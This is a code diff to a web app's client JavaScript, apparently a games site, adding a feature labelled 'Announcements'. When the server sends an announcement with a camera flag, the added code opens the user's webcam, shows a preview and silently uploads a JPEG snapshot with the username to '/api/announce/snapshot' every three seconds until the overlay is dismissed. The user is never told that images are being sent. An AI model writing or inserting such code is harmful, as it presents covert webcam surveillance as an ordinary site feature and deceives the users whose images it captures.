@@ -584,6 +584,101 @@ function initPresence() {
   ping(); setInterval(ping, 60000);
 }
 
+// ── Announcements ────────────────────────
+function initAnnouncements() {
+  const session = JSON.parse(localStorage.getItem("uwu_session") || "{}");
+  if (!session.user) return;
+
+  let lastTs = 0;
+  let camStream = null;
+  let snapInterval = null;
+  let overlay = null;
+
+  function playBeep() {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination);
+      osc.frequency.value = 880;
+      osc.type = "sine";
+      gain.gain.setValueAtTime(0.4, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.8);
+      osc.start(); osc.stop(ctx.currentTime + 0.8);
+    } catch {}
+  }
+
+  function stopCam() {
+    if (snapInterval) { clearInterval(snapInterval); snapInterval = null; }
+    if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
+  }
+
+  async function startCam(videoEl) {
+    try {
+      camStream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
+      videoEl.srcObject = camStream;
+      videoEl.play();
+      const canvas = document.createElement("canvas");
+      canvas.width = 640; canvas.height = 480;
+      const ctx = canvas.getContext("2d");
+      snapInterval = setInterval(async () => {
+        try {
+          ctx.drawImage(videoEl, 0, 0, 640, 480);
+          const imageData = canvas.toDataURL("image/jpeg", 0.7);
+          await fetch("/api/announce/snapshot", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ user: session.user, imageData }),
+          });
+        } catch {}
+      }, 3000);
+    } catch {}
+  }
+
+  function showOverlay(ann) {
+    if (overlay) overlay.remove();
+    overlay = document.createElement("div");
+    overlay.style.cssText = "position:fixed;inset:0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.85);backdrop-filter:blur(8px);gap:20px;padding:24px";
+
+    if (ann.text) {
+      const msg = document.createElement("div");
+      msg.style.cssText = "font-size:clamp(22px,5vw,42px);font-weight:900;color:#fff;text-align:center;max-width:700px;line-height:1.2";
+      msg.textContent = ann.text;
+      overlay.appendChild(msg);
+    }
+
+    if (ann.cam) {
+      const video = document.createElement("video");
+      video.style.cssText = "width:min(480px,90vw);border-radius:16px;border:3px solid #e8196e;transform:scaleX(-1)";
+      video.muted = true; video.autoplay = true; video.playsInline = true;
+      overlay.appendChild(video);
+      startCam(video);
+    }
+
+    const dismiss = document.createElement("button");
+    dismiss.textContent = "Dismiss";
+    dismiss.style.cssText = "padding:12px 32px;border-radius:10px;border:none;background:#e8196e;color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px";
+    dismiss.onclick = () => { overlay.remove(); overlay = null; stopCam(); };
+    overlay.appendChild(dismiss);
+    document.body.appendChild(overlay);
+  }
+
+  async function poll() {
+    try {
+      const res = await fetch("/api/announce");
+      if (!res.ok) return;
+      const { announcement } = await res.json();
+      if (!announcement || announcement.ts <= lastTs) return;
+      lastTs = announcement.ts;
+      if (announcement.sound) playBeep();
+      showOverlay(announcement);
+    } catch {}
+  }
+
+  poll();
+  setInterval(poll, 4000);
+}
+
 // ── Boot ─────────────────────────────────
 (async () => {
   buildSidebar();
@@ -605,4 +700,5 @@ function initPresence() {
   await loadGames();
   await initProxy();
   initPresence();
+  initAnnouncements();
 })();
